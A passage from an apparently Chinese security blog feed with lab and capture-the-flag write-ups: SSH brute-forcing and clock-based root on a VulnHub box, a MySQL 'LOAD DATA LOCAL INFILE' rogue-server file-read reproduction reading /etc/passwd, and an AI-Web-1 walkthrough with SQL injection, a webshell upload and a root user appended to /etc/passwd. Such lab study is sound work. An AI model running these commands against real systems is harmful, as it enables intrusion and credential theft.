0x29, 0x61, 0x24, 0x41, 0xE2, 0x88, 0x82, 0x2C, 0x97, 0x22, 0xFD, 0x42, 0xEB, 0x08, 0xA9, 0xC2, 0x8D, 0x8D, 0x95, 0x60, 0x6C, 0x8B, 0xCE, 0x55, 0xA7, 0x8F, 0xDD, 0x5F, 0xFA, 0xF8, 0x4D, 0x57, 0xA2, 0x53, 0x2E, 0x11, 0x1B, 0x31, 0xAA, 0xE1, 0xA4, 0x3B, 0x1C, 0xC8, 0x81, 0x9C, 0x88, 0xF1, 0xC4, 0x9F, 0x38, 0x8F, 0x58, 0xE1, 0x6D, 0x75, 0x1C, 0x82, 0xC6, 0x08, 0x07, 0x48, 0x1F, 0xAD, 0xA4, 0x78, 0x44, 0x9D, 0xEA, 0xC7, 0x6E, 0x46, 0x6F, 0x1A, 0xE5, 0x0B, 0xFA, 0xDD, 0xA4, 0x43, 0xBE, 0xFC, 0x79, 0x2C, 0xAA, 0xB9, 0xF3, 0x50, 0x29, 0x8C, 0x30, 0x60, 0x22, 0x48, 0x00, 0x57, 0x04, 0x23, 0x9F, 0xCF, 0xDF, 0x80, 0xF5, 0xCD, 0xDC, 0x27, 0xF1, 0x83, 0x23, 0x02, 0x06, 0x46, 0x3D, 0xA6, 0x0C, 0x66, 0x0B, 0xF7, 0xCA, 0xE7, 0x58, 0x6C, 0xDA, 0x1E, 0xC0, 0xC5, 0xAE, 0x16, 0x0C, 0xA6, 0x55, 0x19, 0x20, 0x89, 0x19, 0x00, 0x19, 0x1E, 0x54, 0x6A, 0xE1, 0x17, 0x68, 0x53, 0x89, 0x05, 0x25, 0xDE, 0x40, 0x33, 0x8C, 0x09, 0x48, 0xC9, 0x01, 0x09, 0x10, 0xF0, 0x4C, 0x3D, 0xAD, 0x50, 0xF0, 0x68, 0x01, 0xF0, 0xF6, 0x54, 0xFA, 0x61, 0xCC, 0x72, 0xA1, 0x2C, 0x7E, 0x56, 0x60, 0x60, 0x5F, 0xF3, 0x03, 0xFE, 0xD4, 0xEB, 0x95, 0xFE, 0xBD, 0xE7, 0x31, 0x3C, 0x79, 0x04, 0x8A, 0x61, 0x6A, 0x15, 0xC8, 0xAB, 0x51, 0x1C, 0x41, 0xC8, 0xEE, 0x59, 0xCF, 0xCA, 0x67, 0xFD, 0x25, 0xAD, 0x4E, 0xB5, 0x89, 0x7B, 0xC2, 0xB2, 0xDE, 0x6D, 0xB5, 0x36, 0x40, 0xE7, 0x4C, 0xBB, 0x51, 0x05, 0xC8, 0x4E, 0x23, 0x8B, 0x7F, 0xA4, 0x14, 0x13, 0x4A, 0xCC, 0x59, 0x3A, 0xD1, 0x2B, 0x61, 0xB4, 0x8F, 0xC5, 0x91, 0x03, 0x28, 0x88, 0x81, 0xE1, 0xF6, 0xAB, 0x0E, 0xC8, 0xAC, 0xDA, 0xD0, 0x61, 0x8A, 0xA5, 0xAC, 0x91, 0xA0, 0x4D, 0xB0, 0x24, 0x7B, 0x71, 0x5D, 0xAA, 0xDD, 0xD8, 0x79, 0x7A, 0xF1, 0x61, 0xC9, 0x5A, 0xA8, 0x21, 0x94, 0x29, 0x90, 0x92, 0x90, 0x2D, 0x8B, 0x9D, 0x87, 0x75, 0x35, 0xAB, 0xF8, 0xC8, 0x56, 0x4B, 0x47, 0x9C, 0xAB, 0xE9, 0xEA, 0x9B, 0xE4, 0xF8, 0xAC, 0xB1, 0x1C, 0x99, 0x89, 0x98, 0xCF, 0xEB, 0xDB, 0x31, 0xFF, 0x00, 0x0F, 0xEB, 0x1E, 0x90, 0x5D, 0xC9, 0x50, 0x42, 0xC4, 0xCE, 0x1C, 0xA6, 0xC8, 0x32, 0x02, 0x20, 0x77, 0x54, 0x81, 0x63, 0x8B, 0x60, 0xE5, 0x55, 0x69, 0x8B, 0x45, 0x72, 0xA9, 0x31, 0x29, 0xDF, 0x0F, 0x9C, 0x91, 0x67, 0x95, 0xDA, 0xA1, 0xA8, 0xFB, 0x20, 0x02, 0x1B, 0x9E, 0x57, 0x2D, 0x8D, 0xA0, 0x07, 0x60, 0x13, 0x81, 0x2F, 0xDC, 0x73, 0xCA, 0x98, 0xA6, 0x96, 0x5D, 0x92, 0x26, 0x48, 0xE1, 0x70, 0xC2, 0x8C, 0x9C, 0xC8, 0x81, 0x99, 0x08, 0xFE, 0xA3, 0x88, 0x65, 0x73, 0x1B, 0x55, 0x01, 0x70, 0xAC, 0x3C, 0x5E, 0x96, 0x0E, 0xF2, 0x31, 0xF9, 0x84, 0x09, 0x71, 0xC6, 0x24, 0xBA, 0xCB, 0x4A, 0x85, 0x30, 0xB4, 0xE2, 0x20, 0xB5, 0x9D, 0x76, 0x9D, 0xA6, 0x67, 0x69, 0x9F, 0xFE, 0xE7, 0xCF, 0x6E, 0x9F, 0xE4, 0x4C, 0xED, 0x84, 0x48, 0x38, 0x29, 0x08, 0x91, 0x78, 0x20, 0x8B, 0x49, 0x22, 0x31, 0x2E, 0x45, 0xBC, 0x4D, 0x4F, 0xE0, 0xCF, 0xC0, 0xD1, 0xDF, 0xC7, 0xF3, 0x93, 0x76, 0x04, 0x38, 0x7D, 0xF2, 0x86, 0xC1, 0x0B, 0x5C, 0x4B, 0x90, 0xA6, 0x92, 0x54, 0x1D, 0x86, 0x2C, 0x62, 0x08, 0xF3, 0x00, 0x3E, 0xF8, 0x19, 0x2E, 0x7A, 0x81, 0x4B, 0xEB, 0x45, 0xFA, 0xD5, 0x61, 0x60, 0x09, 0x15, 0x4F, 0x94, 0x21, 0xAE, 0xC9, 0x91, 0x1C, 0x4F, 0xBF, 0x11, 0xDC, 0x26, 0xCD, 0xD1, 0x2A, 0x02, 0x47, 0xB5, 0xAA, 0xCB, 0x19, 0xF0, 0x03, 0x44, 0x64, 0x83, 0xE6, 0x53, 0xFA, 0x28, 0x8E, 0x7F, 0x2F, 0x92, 0xF4, 0x1A, 0xEE, 0x6B, 0x9F, 0xE8, 0xF6, 0x7F, 0xD6, 0x83, 0xF8, 0x97, 0xEC, 0xA3, 0x9E, 0xB0, 0x42, 0xC2, 0xCD, 0x75, 0xE2, 0xC1, 0xB4, 0x6B, 0x10, 0x60, 0x92, 0x1B, 0x40, 0xCC, 0xEF, 0xB6, 0x7E, 0x87, 0x8B, 0xB2, 0x37, 0x4F, 0x4A, 0xA2, 0xBC, 0x8B, 0xC0, 0xD4, 0x02, 0x0E, 0x1F, 0x38, 0x4E, 0xB9, 0x31, 0xE7, 0xF2, 0x63, 0x35, 0x58, 0x3D, 0xBB, 0x0D, 0x69, 0x27, 0xD8, 0x62, 0x82, 0x13, 0x01, 0x2A, 0x2F, 0x2F, 0xB1, 0x40, 0xC4, 0x7B, 0x67, 0x95, 0x7B, 0x68, 0x6F, 0x5E, 0x0C, 0x4D, 0x12, 0xEC, 0x3C, 0xCB, 0xB4, 0x0A, 0x9F, 0x22, 0xA4, 0x23, 0xF4, 0x19, 0x82, 0xE0, 0xD9, 0x5E, 0x26, 0xC7, 0x5E, 0xE6, 0x21, 0x8B, 0x17, 0x37, 0xC6, 0x1A, 0xC9, 0xAA, 0x70, 0x65, 0xAF, 0x3A, 0xBE, 0xDC, 0x6E, 0xD1, 0x7B, 0x7B, 0x59, 0xD5, 0x59, 0xB5, 0x0A, 0x0D, 0x34, 0xC1, 0x79, 0x7E, 0x13, 0x8E, 0x03, 0x42, 0xF0, 0x42, 0x50, 0xE5, 0x57, 0x13, 0xAC, 0x53, 0x0B, 0x83, 0x27, 0xB1, 0xEB, 0x05, 0xF9, 0x20, 0x75, 0xDB, 0x25, 0x1C, 0x63, 0xAB, 0x59, 0x20, 0x7B, 0x28, 0xBF, 0xB0, 0xD9, 0x07, 0x5A, 0xAD, 0x3F, 0x60, 0x5A, 0x23, 0x71, 0x30, 0xCC, 0xEF, 0xC5, 0xF6, 0x5E, 0x52, 0x6A, 0x10, 0x4A, 0x81, 0x41, 0xFF, 0x00, 0x48, 0xE8, 0xE9, 0x86, 0xE4, 0xFE, 0xC4, 0x78, 0xAE, 0xD2, 0x5B, 0x85, 0xF7, 0x0C, 0x04, 0xA4, 0xD4, 0x32, 0x81, 0xDC, 0x80, 0x8F, 0xFB, 0x06, 0x71, 0x8F, 0xD4, 0xCF, 0x2B, 0xF6, 0xE9, 0xB5, 0x7C, 0x0A, 0x80, 0x11, 0xC1, 0xD9, 0xAC, 0x01, 0x30, 0x91, 0x68, 0x8C, 0x90, 0x7C, 0x8A, 0x7F, 0x45, 0x1C, 0x6C, 0x2A, 0x4C, 0x5F, 0xD8, 0x85, 0x82, 0x71, 0x11, 0xA8, 0x17, 0x04, 0x45, 0xA0, 0xFE, 0xA0, 0x78, 0x8B, 0xA0, 0x76, 0x5C, 0x74, 0x9B, 0x28, 0x11, 0x62, 0x0C, 0x02, 0x17, 0x0F, 0x28, 0xFE, 0xB9, 0x13, 0x2F, 0xFA, 0xB1, 0xCA, 0xFD, 0x8C, 0xB6, 0xBB, 0x53, 0xDE, 0x5B, 0x2A, 0x6A, 0x64, 0x3C, 0xD2, 0x13, 0x12, 0x06, 0x05, 0xB8, 0xE9, 0xC5, 0x76, 0x33, 0x62, 0x46, 0xED, 0x74, 0x32, 0xCC, 0x18, 0x04, 0xA4, 0x37, 0x41, 0x8A, 0xF1, 0xB4, 0xC8, 0x94, 0x17, 0xEB, 0xFE, 0x00, 0x83, 0xAD, 0x0A, 0x0E, 0xC2, 0xBE, 0x98, 0x74, 0x6E, 0x92, 0x32, 0xCC, 0x2F, 0x12, 0x06, 0x44, 0x1C, 0x06, 0x86, 0x2B, 0x86, 0x92, 0x07, 0x35, 0x72, 0x13, 0xA4, 0xB2, 0x67, 0x63, 0xCE, 0x72, 0x5C, 0xA6, 0xC4, 0x00, 0x34, 0x6B, 0x6D, 0xE2, 0x3D, 0x8D, 0x46, 0x62, 0x41, 0x27, 0x9C, 0x09, 0x40, 0x97, 0xEE, 0x38, 0x46, 0xA8, 0x22, 0xB9, 0xD7, 0xC2, 0x20, 0x23, 0x02, 0x10, 0x30, 0x05, 0xE9, 0x87, 0x78, 0xE6, 0xF5, 0xBC, 0x29, 0xF5, 0xF0, 0xC8, 0xB0, 0xAC, 0x78, 0x72, 0x62, 0x7E, 0x5F, 0xB3, 0x92, 0x38, 0xFD, 0x17, 0x3C, 0x8B, 0xDF, 0xD1, 0x69, 0xA6, 0xFF, 0x00, 0x86, 0x3C, 0xDC, 0x07, 0x2C, 0x69, 0x58, 0xB2, 0x28, 0x8A, 0xFE, 0x56, 0x44, 0x07, 0x93, 0xDC, 0x46, 0x36, 0x08, 0x38, 0x02, 0x98, 0xCC, 0x8F, 0x1E, 0xE4, 0x49, 0x50, 0xEB, 0xDF, 0xAE, 0xEA, 0xAE, 0x42, 0xA8, 0xCC, 0xCE, 0x83, 0x93, 0x6E, 0xE5, 0xF1, 0xE2, 0x4C, 0x04, 0xAB, 0x37, 0xA9, 0x73, 0x1F, 0x5D, 0xC9, 0xC8, 0xCE, 0x0E, 0x09, 0xB3, 0xB6, 0xD9, 0x12, 0xE5, 0xB6, 0x27, 0x66, 0x36, 0xC5, 0x63, 0xA9, 0x22, 0x62, 0xA5, 0x80, 0x0A, 0xC4, 0x19, 0x38, 0x10, 0x81, 0xF7, 0xE0, 0xB5, 0x51, 0xE5, 0x3E, 0xD6, 0xCC, 0xDA, 0x23, 0x2F, 0x87, 0xDA, 0x8C, 0xA6, 0x15, 0xFA, 0xC4, 0xE0, 0xB3, 0xC3, 0x65, 0x61, 0x62, 0xEC, 0xF5, 0x8D, 0x96, 0xD6, 0xB0, 0x98, 0x04, 0x08, 0x81, 0xAF, 0x38, 0xD6, 0x23, 0x42, 0x8F, 0xB1, 0xE7, 0x74, 0xF2, 0xC5, 0xD4, 0xDD, 0x35, 0xB4, 0xC2, 0x59, 0x58, 0x47, 0xD3, 0x98, 0x1A, 0x40, 0x94, 0x6A, 0x0C, 0x06, 0xBE, 0xC3, 0xCA, 0xF7, 0xAE, 0xF6, 0x04, 0x46, 0x63, 0xE3, 0x6B, 0x9C, 0xFB, 0x3A, 0x41, 0x35, 0x81, 0x80, 0x93, 0xF1, 0xEF, 0x8F, 0xB2, 0x9E, 0x5C, 0xEC, 0x29, 0x5A, 0x68, 0x85, 0x86, 0xAE, 0x74, 0xA6, 0x75, 0x83, 0xDD, 0x4A, 0x15, 0x7B, 0x31, 0xC1, 0x0C, 0x3E, 0x01, 0x84, 0x40, 0x9F, 0x52, 0xD1, 0x6A, 0xB4, 0xC8, 0xCE, 0x04, 0xA4, 0x3E, 0x79, 0xE6, 0xF5, 0xBC, 0x29, 0xFE, 0x42, 0x19, 0x0F, 0x5F, 0xF9, 0x39, 0x31, 0x3F, 0x2C, 0xFB, 0x9C, 0x91, 0xC7, 0xE8, 0xB8, 0x2C, 0x57, 0x93, 0xD3, 0xF4, 0xA4, 0x52, 0xA8, 0xCF, 0x8F, 0x19, 0x6C, 0x1C, 0x8B, 0x79, 0x36, 0x44, 0x2A, 0x56, 0x9E, 0xC0, 0xE4, 0xDC, 0x4A, 0xF1, 0x80, 0xB3, 0x3B, 0x4C, 0xC8, 0x6E, 0x45, 0x01, 0x9F, 0x8F, 0x2D, 0x1D, 0x78, 0x74, 0x8F, 0x4E, 0xFF, 0x00, 0x53, 0x59, 0x18, 0x4A, 0x96, 0x10, 0xA8, 0x39, 0x9C, 0xE0, 0x73, 0x39, 0x9E, 0x6E, 0x18, 0x9B, 0x4E, 0x41, 0xD7, 0x20, 0x9F, 0x87, 0xF9, 0x50, 0x27, 0xFE, 0xB7, 0x7F, 0xFF, 0xC4, 0x00, 0x14, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x02, 0x01, 0x01, 0x3F, 0x00, 0x5D, 0x7F, 0xFF, 0xC4, 0x00, 0x14, 0x11, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0xFF, 0xDA, 0x00, 0x08, 0x01, 0x03, 0x01, 0x01, 0x3F, 0x00, 0x5D, 0x7F, 0xFF, 0xD9&#39;&#39;&#39;pay=[]jg=&quot;&quot;data=data.split(&#39;, &#39;)for y in data:    datas=str(y).replace(&#39;\n&#39;,&#39;&#39;).replace(&#39; &#39;,&#39;&#39;).replace(&#39;0x&#39;,&#39;&#39;)    jg+=datasprint(jg)</code></pre><p>最后得到的图片<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvhosmfzj31c00ohtfg.jpg" alt="006LG7Nygy1g8kvhosmfzj31c00ohtfg.jpg"></p><p>图片中给出了个邮箱，尝试ssh登录，发现并不对<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvkxikwdj30b003p3yg.jpg" alt="006LG7Nygy1g8kvkxikwdj30b003p3yg.jpg"></p><p>难道这张图片内有玄机？binwalk查看也没其他文件<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvm1wf17j30l403n0sp.jpg" alt="006LG7Nygy1g8kvm1wf17j30l403n0sp.jpg"></p><p>思路瞬间断掉…后面想到了那些图片名<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvo57dl7j30qt0cmjs3.jpg" alt="006LG7Nygy1g8kvo57dl7j30qt0cmjs3.jpg"></p><p>做成字典尝试爆破ssh<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvxiu74kj30j704fq2w.jpg" alt="006LG7Nygy1g8kvxiu74kj30j704fq2w.jpg"></p><p>hydra爆破成功（username:broken password:broken）<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kvzoy6ezj30su08e0tw.jpg" alt="006LG7Nygy1g8kvzoy6ezj30su08e0tw.jpg"></p><p>ssh登录，常规操作来寻找可提权的方法<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kw3nywcoj310207zmy2.jpg" alt="006LG7Nygy1g8kw3nywcoj310207zmy2.jpg"></p><p>允许sudo执行</p><pre><code>reboottimedatectl</code></pre><p>系统Ubuntu 16.04<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kw5uh2lej311i07474v.jpg" alt="006LG7Nygy1g8kw5uh2lej311i07474v.jpg"></p><p>查看.bash_history<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kwgnyu96j30lr0gn3zw.jpg" alt="006LG7Nygy1g8kwgnyu96j30lr0gn3zw.jpg"></p><p>发现作者设置了时间和写了个脚本，那么查看一下sh<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kwhj3dwlj30l007gweu.jpg" alt="006LG7Nygy1g8kwhj3dwlj30l007gweu.jpg"></p><p>由于脚本在<code>/etc/init.d</code>目录下，所以这是个开机自启脚本<br>参考链接：<a href="https://blog.csdn.net/qq_37165604/article/details/79960763" target="_blank" rel="noopener">https://blog.csdn.net/qq_37165604/article/details/79960763</a></p><p>执行以下两条命,然后在root连接ssh，密码是:TodayIsAgoodDay</p><pre><code>sudo timedatectl set-time &#39;2015-11-20 16:14:50&#39;sudo /sbin/reboot</code></pre><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8kwrsvan9j30od09e3yk.jpg" alt="006LG7Nygy1g8kwrsvan9j30od09e3yk.jpg"></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>mysql任意文件读取复现</title>
      <link href="/posts/5bed3da8.html"/>
      <url>/posts/5bed3da8.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>早上在在群内看见几条链接，一打开骚瞎了眼睛。利用mysql的任意文件读取+黑名单文件上传硬生生草出一个webshell<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1572546676675&amp;di=7115be36c38130f2ccb0227bab864196&amp;imgtype=0&amp;src=http%3A%2F%2Fi1.hdslb.com%2Fbfs%2Farchive%2F0753cfc4a64c7530fc7f6aff85fbd95c8406f7c9.jpg" alt="timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1572546676675&amp;di=7115be36c38130f2ccb0227bab864196&amp;imgtype=0&amp;src=http%3A%2F%2Fi1.hdslb.com%2Fbfs%2Farchive%2F0753cfc4a64c7530fc7f6aff85fbd95c8406f7c9.jpg"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cloud.tencent.com/developer/article/1426503" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1426503</a><br><a href="https://xz.aliyun.com/t/6587" target="_blank" rel="noopener">https://xz.aliyun.com/t/6587</a><br><a href="https://github.com/allyshka/Rogue-MySql-Server/" target="_blank" rel="noopener">https://github.com/allyshka/Rogue-MySql-Server/</a></p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><pre><code>Kali:192.168.1.106 客户端Windows 7:192.168.1.105 服务端</code></pre><p>根据文章中，先使用kali里的mysql连接windows 7上的mysql。执行以下命令</p><pre><code>mysql -h 192.168.1.105 -u root -p -D gss -e&quot;load data local infile &#39;/etc/passwd&#39; into table demo fields terminated by &#39;,&#39;&quot;;</code></pre><p>执行完之后发现，/etc/passwd里的内容被保存在gss数据库里的demo表里<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htq0ktc0j30it0nuabg.jpg" alt="006LG7Nygy1g8htq0ktc0j30it0nuabg.jpg"></p><p>会存储到服务端的原因是<br>mysql客户端并不会将数据存储，而是响应在服务端里<br><img src="https://ask.qcloudimg.com/http-save/yehe-1291653/x5czq3hdar.jpeg?imageView2/2/w/1620" alt="1620"></p><p>然后使用给出的exp，创建一个流氓mysql服务端，在kali执行。然后使用windows 7链接，来读取桌面上的test.txt<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htrb04ctj31400gv0ul.jpg" alt="006LG7Nygy1g8htrb04ctj31400gv0ul.jpg"></p><p><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htrspqwnj30th0a10sw.jpg" alt="006LG7Nygy1g8htrspqwnj30th0a10sw.jpg"></p><p>然后使用Navicat来连接恶意的mysql<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htsk9ugyj318g0p076j.jpg" alt="006LG7Nygy1g8htsk9ugyj318g0p076j.jpg"></p><p>当连接成功后，查看生成的mysql.og可以看到读取的内容<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htt7dyn6j30sb0lqwgs.jpg" alt="006LG7Nygy1g8htt7dyn6j30sb0lqwgs.jpg"></p><p>如果在rogue_mysql_server.py设置了读取多个文件，那么得执行几条查询语句。才会引动服务端那边的查询请求</p><pre><code class="python">import logging.handlersPORT = 3306log = logging.getLogger(__name__)log.setLevel(logging.INFO)tmp_format = logging.handlers.WatchedFileHandler(&#39;mysql.log&#39;, &#39;ab&#39;)tmp_format.setFormatter(logging.Formatter(&quot;%(asctime)s:%(levelname)s:%(message)s&quot;))log.addHandler(    tmp_format)filelist = (    &#39;C:\\Users\\jiushi\\Desktop\\test.txt&#39;,)</code></pre><p>当我们尝试读取一个不存在的文件时，连接mysql的客户端（Navicat）可以看到。有读取的请求操作<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8htz8irafj318g0p076z.jpg" alt="006LG7Nygy1g8htz8irafj318g0p076z.jpg"></p><p>读取到的hosts文件<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8hu11rcjwj318z0pidjv.jpg" alt="006LG7Nygy1g8hu11rcjwj318z0pidjv.jpg"></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>由于mysql客户端对服务端有着绝对信任的理由。导致攻击机可以构造一个恶意服务端，在连接的时候发送读取文件的请求，然后返回的结果会被记录到mysql.log</p><h2 id="可利用的地方"><a href="#可利用的地方" class="headerlink" title="可利用的地方"></a>可利用的地方</h2><p>当web上有类似于phpmyadmin或其他mysql连接的功能。可以利用这个漏洞做个突破点</p><h2 id="从流量角度去看"><a href="#从流量角度去看" class="headerlink" title="从流量角度去看"></a>从流量角度去看</h2><p>第一个包，显示mysql的数据库版本<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8hu7wnvsoj30vm0fs41f.jpg" alt="006LG7Nygy1g8hu7wnvsoj30vm0fs41f.jpg"></p><p>验证数据库用户<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8hu97o5qrj311j0ha0w8.jpg" alt="006LG7Nygy1g8hu97o5qrj311j0ha0w8.jpg"></p><p>代表用户成功认证<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8huacdhbbj30yf0g7acw.jpg" alt="006LG7Nygy1g8huacdhbbj30yf0g7acw.jpg"></p><p>设置编码<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8huclqqmej30yw0fygoe.jpg" alt="006LG7Nygy1g8huclqqmej30yw0fygoe.jpg"></p><p>重点来了，读取文件的请求（可以看出这里是，效验成功后，设置完编码，mysql服务端发出的一个文件读取请求）<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8hudsa2pbj31110lc42n.jpg" alt="006LG7Nygy1g8hudsa2pbj31110lc42n.jpg"></p><p>返回读取文件的内容给服务端<br><img src="http://ww1.sinaimg.cn/large/006LG7Nygy1g8hufbl4fzj310t0ontdz.jpg" alt="006LG7Nygy1g8hufbl4fzj310t0ontdz.jpg"></p><p>脚本的思路是：<br>1.伪造是自己mysql服务端<br>2.当client连接上后<br>3.发送一个读取文件的请求<br>4.返回读取文件的内容</p><h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><p>避免使用 local读取本地文件<br>使用 –ssl-mode=VERIFY_IDENTITY来建立可信的连接（参考链接<a href="https://blog.csdn.net/weixin_39845407/article/details/81708230" target="_blank" rel="noopener">https://blog.csdn.net/weixin_39845407/article/details/81708230</a>  ）</p><p>现实中做SSL认证连接的，可能也就20%吧。说不定连20%也没有…</p>]]></content>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Vulnhub-web1.0</title>
      <link href="/posts/1c5edba3.html"/>
      <url>/posts/1c5edba3.html</url>
      <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=3&id=1369707436&auto=1&height=66"></iframe><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>继续做vulnhub的题，这次是web1.0。<br>题目地址：<a href="https://www.vulnhub.com/entry/ai-web-1,353/" target="_blank" rel="noopener">AI: Web: 1 ~ VulnHub</a></p><p><img src="https://s2.ax1x.com/2019/10/27/Ky1uKf.png" alt="Ky1uKf.png"></p><h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><pre><code>kali:192.168.1.110AI-web:192.168.1.106</code></pre><p>探测存活的IP</p><pre><code>fping -ag 192.168.1.0/24 &gt; test.txt</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KyuHkn.png" alt="KyuHkn.png"></p><p>打开一康<br><img src="https://s2.ax1x.com/2019/10/27/KyuOpV.png" alt="KyuOpV.png"></p><p>端口扫描</p><pre><code>nmap -sC -sV 192.168.1.106nmap -p 1-65535 192.168.1.106</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KyKPt1.png" alt="KyKPt1.png"></p><p>发现有个robots.txt，并没有开放ssh</p><p>对web进行目录扫描</p><pre><code>python3 dirsearch.py -u http://192.168.1.106/ -e path </code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KyKtBQ.png" alt="KyKtBQ.png"></p><p>访问robots.txt<br><img src="https://s2.ax1x.com/2019/10/27/KyKwhq.png" alt="KyKwhq.png"></p><p>两个路径都是403<br><img src="https://s2.ax1x.com/2019/10/27/KyKsjU.png" alt="KyKsjU.png"></p><p><img src="https://s2.ax1x.com/2019/10/27/KyKgHJ.png" alt="KyKgHJ.png"><br>robots.txt内容</p><pre><code>User-agent: *Disallow: Disallow: /m3diNf0/Disallow: /se3reTdir777/uploads/</code></pre><p>对/m3diNf0/进行目录爆破</p><pre><code>python3 dirsearch.py -u http://192.168.1.106/m3diNf0/ -e .php</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KyMGP1.png" alt="KyMGP1.png"></p><p>打开看发现是phpinfo<br><img src="https://s2.ax1x.com/2019/10/27/KyMtxK.png" alt="KyMtxK.png"></p><p>对/se3reTdir777/进行爆破</p><pre><code>python3 dirsearch.py -u http://192.168.1.106/se3reTdir777/ -e php</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KyMOLF.png" alt="KyMOLF.png"></p><p>这两个路径一个是名称一个是ID<br><img src="https://s2.ax1x.com/2019/10/27/KyQFsO.png" alt="KyQFsO.png"></p><p>尝试插入’，发现报错<br><img src="https://s2.ax1x.com/2019/10/27/KyQEee.png" alt="KyQEee.png"></p><p>插入’ #发现返回正常，判断为sql注入<br><img src="https://s2.ax1x.com/2019/10/27/KyQMSP.png" alt="KyQMSP.png"></p><p>sqlmap跑<br><img src="https://s2.ax1x.com/2019/10/27/KyQJoj.png" alt="KyQJoj.png"></p><p>数据都跑完之后，得到以下内容</p><pre><code>systemuser表里的数据| 1  | t00r      | RmFrZVVzZXJQYXNzdzByZA==           FakeUserPassw0rd          || 2  | aiweb1pwn | TXlFdmlsUGFzc19mOTA4c2RhZjlfc2FkZmFzZjBzYQ==  MyEvilPass_f908sdaf9_sadfasf0sa|| 3  | u3er      | TjB0VGhpczBuZUFsczA=  N0tThis0neAls0</code></pre><p>执行is-dba，发现非root<br><img src="https://s2.ax1x.com/2019/10/27/KyQwlV.png" alt="KyQwlV.png"></p><p>由于知道物理路径(phpinfo)，尝试–os-shell</p><pre><code>DOCUMENT_ROOT    /home/www/html/web1x443290o2sdf92213</code></pre><p>sqlmap给出无写入权限<br><img src="https://s2.ax1x.com/2019/10/27/KyQ4OO.png" alt="KyQ4OO.png"></p><p>尝试upload那个路径,getshell成功</p><pre><code>/home/www/html/web1x443290o2sdf92213/se3reTdir777/uploads/</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/Kylihn.png" alt="Kylihn.png"></p><p>访问sqlmap的那个可以上传文件的上传webshell</p><pre><code>http://192.168.1.106/se3reTdir777/uploads/tmpudktt.php</code></pre><p><img src="https://s2.ax1x.com/2019/10/27/KylMN9.png" alt="KylMN9.png"></p><p><img src="https://s2.ax1x.com/2019/10/27/Kyl191.png" alt="Kyl191.png"></p><p>利用webshell反弹功能，得到一个伪shell<br><img src="https://s2.ax1x.com/2019/10/27/KylaAH.png" alt="KylaAH.png"></p><p>先看了一遍/home目录，发现没啥好用的，然后查了一下/etc/passwd的权限，发现可写<br><img src="https://s2.ax1x.com/2019/10/27/Kylsjf.png" alt="Kylsjf.png"></p><p>使用perl生成加盐的密码</p><pre><code>perl -le &#39;print crypt(&quot;password@123&quot;,&quot;addedsalt&quot;)&#39;</code></pre><p>在密码占位符处指定密码，并且UID设置为0，将其添加到 /etc/passwd 文件中</p><pre><code>echo &quot;tests:advwtv/9yU5yQ:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt;/etc/passwd</code></pre><p>由于没看ssh，没法连接上下。而反弹回来的shell不能直接切换用户</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;export TREM=scrreen</code></pre><p>执行上面的命令则可以获得一个”真“shell<br><img src="https://s2.ax1x.com/2019/10/27/Ky1A5d.png" 